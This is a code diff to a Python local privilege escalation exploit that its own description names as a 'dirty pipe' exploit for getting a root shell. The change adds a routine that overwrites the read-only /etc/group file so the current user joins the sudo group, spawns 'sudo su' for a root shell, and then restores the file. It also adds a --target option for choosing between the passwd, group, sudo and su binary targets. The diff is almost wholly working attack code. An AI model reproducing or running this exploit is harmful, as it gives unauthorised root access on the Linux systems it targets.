@@ -161,6 +161,34 @@ def find_offset_of_user_in_passwd(user):
 
     return False
 
+
+def find_offset_of_sudo_in_group(user):
+    file_offset = 0
+    to_write = ''
+
+    
+    with open('/etc/group', 'r') as group:
+        orig_file = group.read()
+        group.seek(0)
+
+        for line in group.readlines():
+            fields = line.split(':')
+            if not fields[0].strip() == 'sudo':
+                file_offset += len(line)
+            else:
+                file_offset += len(line) - 1
+                to_write = f',{user}\n'
+                try:
+                    # Save original for recovering
+                    original = orig_file[file_offset:file_offset+len(to_write)]
+                except IndexError:
+                    return False # Cannot be last line of file
+
+                return file_offset - 1, to_write, original
+
+    return False
+
+
 def within_page_bounds(file_offset, data_len):
     # Ensure that we are not at a page boundary
     if file_offset % PAGE == 0:
@@ -187,6 +215,20 @@ def check_etc_passwd():
         return False
 
     # Check if on boundary
+    if not within_page_bounds(offset_data[0], len(offset_data[1])):
+        return False
+
+    return True
+
+def check_etc_group():
+    if not exists('/etc/group'):
+        return False
+
+    user = getpass.getuser()
+    offset_data = find_offset_of_sudo_in_group(user)
+    if not offset_data:
+        return False
+
     if not within_page_bounds(offset_data[0], len(offset_data[1])):
         return False
 
@@ -245,9 +287,9 @@ def run_elf(binary_name):
     print()
 
     # Cleanup
-    print(f'[*] Remember to cleanup {backup_path} and /tmp/sh')
-    print(f'[*]   rm {backup_path}')
-    print('[*]   rm /tmp/sh')
+    print(f'[!] Remember to cleanup {backup_path} and /tmp/sh')
+    print(f'[!]   rm {backup_path}')
+    print('[!]   rm /tmp/sh')
 
 
 def run_etc_passwd():
@@ -278,30 +320,77 @@ def run_etc_passwd():
     print(f'[*] Restoring {target_file}')
     run_poc(bytes(original, 'utf-8'), target_file, file_offset)
 
-    print(f'[*] Remember to cleanup {backup_path}')
-    print(f'[*]   rm {backup_path}')
+    print(f'[!] Remember to cleanup {backup_path}')
+    print(f'[!]   rm {backup_path}')
+
+
+def run_etc_group():
+    # Backup file
+    backup_path = '/tmp/group'
+    target_file = '/etc/group'
+    print(f'[*] Backing up {target_file} to {backup_path}')
+    backup_file(target_file, backup_path)
+
+    # Get offset
+    user = getpass.getuser()
+    print(f'[*] Calculating offset of {user} in {target_file}')
+
+    (file_offset, 
+     data_to_write, 
+     original) = find_offset_of_sudo_in_group(user)
+
+    # Exploit
+    print(f'[*] Hijacking {target_file}') 
+    run_poc(bytes(data_to_write, 'utf-8'), target_file, file_offset)
+
+    # Pop a shell
+    print(f'[*] Popping root shell...')
+    print()
+    print(f'[!] Login with password of {user} (you will have to login twice)')
+    print()
+    # Login as user to refresh groups, then call sudo su in a pseudo terminal with -P flag
+    pty.spawn(['su', user, '-P', '-c', 'sudo su']) 
+    print()
+
+    print(f'[*] Restoring {target_file}')
+    run_poc(bytes(original, 'utf-8'), target_file, file_offset)
+
+    print(f'[!] Remember to cleanup {backup_path}')
+    print(f'[!]   rm {backup_path}')
+
 
 def main():
     parser = argparse.ArgumentParser(description='Use dirty pipe vulnerability to pop root shell')
+    parser.add_argument('--target', choices=['passwd','group','sudo','su'], help='The target read-only file to overwrite')
     args = parser.parse_args()
 
-    print(f'[*] Attempting to modify /etc/passwd') 
-    if check_etc_passwd():
-        run_etc_passwd()
-        sys.exit()
-    print(f'[X] Cannot modify /etc/passwd') 
+    if not args.target or args.target == 'passwd':
+        print(f'[*] Attempting to modify /etc/passwd') 
+        if check_etc_passwd():
+            run_etc_passwd()
+            sys.exit()
+        print(f'[X] Cannot modify /etc/passwd') 
 
-    print(f'[*] Attempting to modify sudo binary') 
-    if check_elf('sudo'):
-        run_elf('sudo')
-        sys.exit()
-    print(f'[X] Cannot modify sudo binary') 
+    if not args.target or args.target == 'sudo':
+        print(f'[*] Attempting to modify sudo binary') 
+        if check_elf('sudo'):
+            run_elf('sudo')
+            sys.exit()
+        print(f'[X] Cannot modify sudo binary') 
 
-    print(f'[*] Attempting to modify su binary') 
-    if check_elf('su'):
-        run_elf('su')
-        sys.exit()
-    print(f'[X] Cannot modify su binary') 
+    if not args.target or args.target == 'su':
+        print(f'[*] Attempting to modify su binary') 
+        if check_elf('su'):
+            run_elf('su')
+            sys.exit()
+        print(f'[X] Cannot modify su binary') 
+
+    if not args.target or args.target == 'group':
+        print(f'[*] Attempting to modify /etc/group') 
+        if check_etc_group():
+            run_etc_group()
+            sys.exit()
+        print(f'[X] Cannot modify /etc/group') 
 
     print(f'[X] Exploit could not be executed!') 
 
